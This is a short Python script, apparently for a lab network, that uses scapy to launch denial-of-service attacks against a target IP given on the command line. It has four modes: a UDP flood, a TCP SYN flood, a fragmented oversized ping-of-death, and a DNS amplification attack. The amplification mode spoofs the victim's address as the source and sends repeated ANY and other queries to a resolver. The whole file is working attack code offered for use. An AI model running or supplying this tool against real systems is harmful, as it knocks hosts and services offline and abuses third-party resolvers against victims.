from scapy.all import *
import sys

mode = str(sys.argv[1])
dstIP = sys.argv[2]
try :
	dstPort = int(sys.argv[3])
except:
	dstPort = 53
Interface = 'eth1'
n_loop = 1


payload = Raw(b"X"*1024)

if mode == "UDP":
    # UDP
    p = IP(dst=dstIP)/UDP(dport = dstPort)/payload
    print(f"start UDP Flooding attack on {dstIP} port {dstPort}")
    send(p,loop = n_loop, inter=0.01, verbose = 0,iface=Interface)
    
elif mode == "TCP":
    #TCP
    p = IP(dst=dstIP) / TCP(sport=RandShort(), dport=dstPort, flags="S") / payload
    print(f"start TCP Flooding attack on {dstIP} port {dstPort}")
    send(p,loop = n_loop, inter=0.01, verbose = 0,iface=Interface)
            
elif mode == "PingDeath":
    # Ping of Death
    p = fragment(IP(dst=dstIP)/ICMP()/(b"X"*66000))
    send(p,loop = n_loop, inter=0.01, verbose = 0,iface=Interface)
    
elif mode == "DNS":
    # DNS amplication
    dns_destination=["192.168.5.129"]                                                              
    query_name = "exampe.com"                                                          
    query_type = ["ANY", "A","AAAA","CNAME","MX","NS","PTR","CERT","SRV","TXT", "SOA"] 
    print(f"start DNS amplication attack on {dstIP} ")
    for l in range(0,10000):
    	for i in range(0,len(query_type)):
    		for j in range(0, len(dns_destination)):
    			p= IP(src = dstIP, dst=dns_destination[j]) / UDP(dport = dstPort) / DNS(rd=1, qd=DNSQR(qname=query_name, qtype=query_type[i]))
    			send(p,verbose=0)
else :
    print("fail mode")
    exit(1)
